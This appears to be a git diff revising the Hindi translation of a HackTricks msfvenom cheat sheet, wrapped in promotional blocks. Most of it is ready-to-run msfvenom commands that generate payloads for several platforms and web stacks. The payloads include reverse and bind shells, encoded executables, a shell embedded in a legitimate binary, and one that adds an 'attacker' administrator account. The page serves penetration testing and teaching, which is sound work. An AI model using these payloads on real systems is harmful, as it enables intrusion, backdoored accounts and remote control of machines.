@@ -1,33 +1,33 @@
-# MSFVenom - चीटशीट
+# MSFVenom - CheatSheet
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
 
-* क्या आप एक **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
-* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
-* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**
+HackTricks का समर्थन करने के अन्य तरीके:
+
+* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
+* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
+* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof में सभी क्रिप्टो बग बाउंटी होम है।**
+[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल हों और अनुभवी हैकर्स और बग बाउंटी हंटर्स के साथ संवाद करें!
 
-**देरी के बिना पुरस्कार प्राप्त करें**\
-HackenProof बाउंटी केवल तब शुरू होती हैं जब उनके ग्राहक इनाम बजट जमा करते हैं। आपको इनाम उस बग को सत्यापित करने के बाद मिलेगा।
+**हैकिंग इनसाइट्स**\
+हैकिंग के रोमांच और चुनौतियों के बारे में गहराई से जानकारी प्राप्त करें
 
-**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
-ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।
+**रियल-टाइम हैक न्यूज**\
+रियल-टाइम न्यूज और इनसाइट्स के माध्यम से हैकिंग की तेजी से बदलती दुनिया के साथ अपडेट रहें
 
-**वेब3 हैकर लीजेंड बनें**\
-प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।
+**नवीनतम घोषणाएँ**\
+नवीनतम बग बाउंटीज लॉन्चिंग और महत्वपूर्ण प्लेटफॉर्म अपडेट्स के साथ सूचित रहें
 
-[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!
-
-{% embed url="https://hackenproof.com/register" %}
+[**Discord**](https://discord.com/invite/N3FrSbmwdy) पर **हमसे जुड़ें** और आज ही शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!
 
 ***
 
@@ -35,24 +35,14 @@ HackenProof बाउंटी केवल तब शुरू होती ह
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-व्यक्ति आर्किटेक्चर को निर्दिष्ट करने के लिए `-a` भी उपयोग कर सकता है या `--platform`
+आर्किटेक्चर निर्दिष्ट करने के लिए `-a` का उपयोग भी कर सकते हैं या `--platform`
+
+## सूचीबद्ध करना
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## शैलकोड बनाते समय सामान्य पैरामीटर्स
-
-जब हम एक शैलकोड बनाते हैं, तो इसमें आमतौर पर निम्नलिखित पैरामीटर्स होते हैं:
-
-- `--platform` : शैलकोड के लिए चयनित प्लेटफॉर्म (जैसे windows, linux, android)
-- `--arch` : शैलकोड के लिए चयनित आर्किटेक्चर (जैसे x86, x64, arm)
-- `--payload` : उपयोग किया जाने वाला पेलोड (जैसे reverse shell, bind shell)
-- `--encoder` : शैलकोड को एन्कोड करने के लिए चयनित एन्कोडर (जैसे xor, base64)
-- `--iterations` : एन्कोडिंग के लिए चयनित इटरेशन्स की संख्या
-- `--format` : शैलकोड का चयनित फॉर्मेट (जैसे exe, dll, raw)
-- `--out` : निर्मित शैलकोड का नाम और स्थान
-
-ये पैरामीटर्स शैलकोड बनाने के दौरान उपयोग होते हैं।
+## शेलकोड बनाते समय सामान्य पैरामीटर
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -60,7 +50,7 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-## **Windows**
+## **विंडोज**
 
 ### **रिवर्स शेल**
 
@@ -80,13 +70,13 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-### CMD शैल
+### CMD शेल
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **कमांड चलाएं**
+### **कमांड निष्पादित करें**
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,15 +89,15 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### कार्यक्षम में सम्मिलित
+### एक्जीक्यूटेबल के अंदर एम्बेडेड
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## लिनक्स पेलोड
+## Linux Payloads
 
-### रिवर्स शेल
+### Reverse Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -120,15 +110,13 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
-{% endcode %}
-
-### SunOS (सोलारिस)
+### SunOS (Solaris)
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **MAC पेलोड**
+## **MAC पेलोड्स**
 
 ### **रिवर्स शेल:**
 
@@ -136,15 +124,13 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-### **बाइंड शेल**
+### **Bind Shell**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-{% endcode %}
-
-## **वेब आधारित Payloads**
+## **वेब आधारित पेलोड्स**
 
 ### **PHP**
 
@@ -155,8 +141,6 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
-{% endcode %}
-
 ### ASP/x
 
 #### रिवर्स शेल
@@ -166,8 +150,6 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
-{% endcode %}
-
 ### JSP
 
 #### रिवर्स शेल
@@ -176,8 +158,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
-{% endcode %}
-
 ### WAR
 
 #### रिवर्स शेल
@@ -186,41 +166,25 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
-{% endcode %}
-
 ### NodeJS
-
-NodeJS is a popular runtime environment for executing JavaScript code outside of a web browser. It allows developers to build scalable and high-performance applications using JavaScript on the server-side. NodeJS provides a rich set of libraries and modules that can be used to develop various types of applications, including web servers, command-line tools, and desktop applications.
-
-NodeJS is built on the V8 JavaScript engine, which is developed by Google and used in the Chrome web browser. This engine compiles JavaScript code into machine code, making it faster and more efficient than traditional interpreters.
-
-One of the key features of NodeJS is its event-driven, non-blocking I/O model. This means that NodeJS can handle a large number of concurrent connections without blocking the execution of other code. This makes it ideal for building real-time applications, such as chat servers and streaming services.
-
-NodeJS also has a built-in package manager called npm (Node Package Manager), which allows developers to easily install and manage third-party libraries and modules. This makes it easy to reuse code and leverage the work of other developers.
-
-Overall, NodeJS is a powerful and versatile platform for building server-side applications with JavaScript. Its performance, scalability, and extensive library ecosystem make it a popular choice among developers.
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **स्क्रिप्ट भाषा पेलोड**
+## **स्क्रिप्ट भाषा पेलोड्स**
 
-### **पर्ल**
+### **Perl**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
-{% endcode %}
-
 ### **Python**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-{% endcode %}
-
-### **बैश**
+### **Bash**
 
 {% code overflow="wrap" %}
 ```bash
@@ -230,29 +194,29 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof में सभी क्रिप्टो बग बाउंटी होती है।**
+[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल हों और अनुभवी हैकर्स और बग बाउंटी हंटर्स के साथ संवाद करें!
 
-**देरी के बिना पुरस्कार प्राप्त करें**\
-HackenProof बाउंटी तभी शुरू होती हैं जब उनके ग्राहक पुरस्कार बजट जमा करते हैं। आपको बग के सत्यापन के बाद पुरस्कार मिलेगा।
+**Hacking Insights**\
+हैकिंग के रोमांच और चुनौतियों पर गहराई से जानकारी प्राप्त करें
 
-**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
-ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।
+**Real-Time Hack News**\
+रियल-टाइम न्यूज़ और अंतर्दृष्टि के माध्यम से हैकिंग की तेज़ी से बदलती दुनिया के साथ अपडेट रहें
 
-**वेब3 हैकर लीजेंड बनें**\
-प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।
+**Latest Announcements**\
+नवीनतम बग बाउंटीज़ के लॉन्च और महत्वपूर्ण प्लेटफॉर्म अपडेट्स के साथ सूचित रहें
 
-[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!
-
-{% embed url="https://hackenproof.com/register" %}
+[**Discord**](https://discord.com/invite/N3FrSbmwdy) पर हमसे जुड़ें और आज ही शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो**? या क्या आपको **PEASS की नवीनतम संस्करण देखना है या HackTricks को PDF में डाउनलोड करना है**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
-* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**।**
-* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**
+HackTricks का समर्थन करने के अन्य तरीके:
+
+* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
+* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
+* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में **शामिल हों** या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
+* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.
 
 </details>
